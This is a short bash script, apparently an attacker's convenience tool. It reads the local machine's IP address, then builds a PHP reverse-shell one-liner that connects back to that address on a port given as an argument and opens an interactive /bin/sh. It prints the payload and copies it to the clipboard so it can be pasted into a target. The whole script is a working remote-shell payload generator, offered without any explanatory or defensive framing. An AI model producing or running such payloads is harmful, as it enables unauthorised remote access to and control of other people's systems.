#!/bin/bash
IP=$( hostname -I );
New_IP=$( echo -n $IP );
echo "php -r '\$sock=fsockopen(\"$New_IP\",$1);exec(\"/bin/sh -i <&3 >&3 2>&3\");'";
echo "php -r '\$sock=fsockopen(\"$New_IP\",$1);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" | clip;
